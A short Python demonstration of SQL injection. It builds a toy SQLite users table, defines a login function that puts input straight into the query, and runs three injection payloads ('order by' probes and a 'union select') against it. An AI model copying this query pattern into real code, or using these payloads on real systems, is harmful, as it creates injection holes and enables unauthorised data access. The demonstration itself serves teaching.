import sqlite3

# Connect to the SQLite database (or any other database you have access to)
conn = sqlite3.connect(':memory:')  # Using in-memory database for simplicity

# Create a table with a vulnerable query construction (for demonstration purposes only)
conn.execute('''CREATE TABLE users (
                id INTEGER PRIMARY KEY,
                username TEXT,
                password TEXT
                )''')

# Insert some sample data
conn.execute("INSERT INTO users (username, password) VALUES ('admin', 'admin123')")
conn.execute("INSERT INTO users (username, password) VALUES ('user', 'password123')")

# Vulnerable function that constructs a query without proper input validation
def login(username):
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE username = '{username}'"  # Vulnerable query
    cursor.execute(query)
    query = f""
    return cursor.fetchall()

# Attempt to exploit the vulnerability using SQL injection
def exploit():
    payloads = [
        "' order by 1--",
        "' order by 2--",
        "' union select null,null,null--"
    ]

    for payload in payloads:
        print(f"Trying payload: {payload}")
        result = login(payload)
        print("Result:", result)

if __name__ == "__main__":
    exploit()
